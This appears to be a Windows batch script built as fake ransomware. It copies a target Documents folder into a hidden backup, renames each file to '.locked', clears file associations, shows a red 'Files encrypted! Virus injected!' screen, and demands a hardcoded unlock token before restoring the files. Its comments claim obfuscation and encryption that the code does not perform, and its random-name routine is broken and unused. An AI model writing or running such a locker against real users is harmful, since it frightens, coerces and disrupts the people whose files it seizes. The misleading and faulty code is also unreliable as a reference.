@echo off
title System
color 0C

set "a=%userprofile%\OneDrive\Dokumen\target"
set "b=%userprofile%\Videos\Backup_Encrypted"
set "c=%userprofile%\Videos\Backup_Encrypted\enc.lock"
set "d=qwertyuiopoi"
setlocal enabledelayedexpansion

REM Obfuscated script begins
if exist "%b%" (
    echo ########################################
    echo Files in "%a%" encrypted!
    echo Virus injected!
    echo ########################################
    echo.

    goto :e
)

mkdir "%b%"
xcopy /s /i "%a%" "%b%" >nul
attrib +h +s "%b%"

assoc .locked=
ftype lockedfile=

REM Encryption process starts
> "%c%" (
    for /r "%a%" %%F in (*) do (
        echo [Processing] %%F ==
        echo File: %%F>>"%c%"

        REM Random extension generation
        set "f="
        for /l %%A in (1,1,8) do (
            set /a "g=!random! %% 36"
            if !g! lss 10 (
                set "f=!f!!g!"
            ) else (
                set /a "g=!g! - 10 + 65"
                for %%B in (!g!) do set "f=!f!!B!"
            )
        )

        ren "%%F" "%%~nF.locked"

        REM Random file content
        for /l %%C in (1,1,500) do (
            set /a "h=!random! %% 36"
            if !h! lss 10 (
                set "i=!h!"
            ) else (
                set /a "h=!h! - 10 + 65"
                for %%D in (!h!) do set "i=!i!!D!"
            )
            echo !i!>>"%c%"
        )
    )
)
attrib +h +s "%c%"
cls
echo ########################################
echo Files in "%a%" encrypted!
echo Virus injected!
echo ########################################
echo.
:e
set /p "j=Enter Token: "

if "%j%"=="%d%" (
    color a
    echo [SUCCESS] Token valid!

    REM Deleting files
    for /r "%a%" %%F in (*) do (
        del /f "%%F"
    )

    echo [Processing...]
    xcopy /s /y "%b%\*" "%a%" >nul

    rmdir /s /q "%b%"
    del /f "%c%"

    echo [SUCCESS]
    pause
) else (
    echo Invalid Token!
    goto :e
)

:continue
echo.
pause >nul
goto :continue
